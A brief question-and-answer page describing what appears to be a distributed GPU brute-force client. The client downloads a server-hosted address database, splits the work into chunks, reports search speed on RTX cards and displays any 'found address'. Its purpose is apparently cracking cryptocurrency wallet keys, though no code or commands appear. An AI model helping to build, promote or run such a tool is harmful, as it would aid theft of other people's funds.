## Question and Answer

All clients perform their part (chunk) of the overall task.<br>
Only CUDA cards support GTX, RTX, CMP<br>
Brute speed:<br>
RTX 4090 = 60k/s<br>
RTX 5090 = 90k/s<br>


The client automatically downloads the address database. <br>
If the database on the server has changed, it automatically updates it. <br>
After downloading, the client checks the checksum of the database, which excludes incompletely downloaded addresses.

After launching, the client displays only the speed.<br>
If the client finds an address, the window displays the found address.<br>
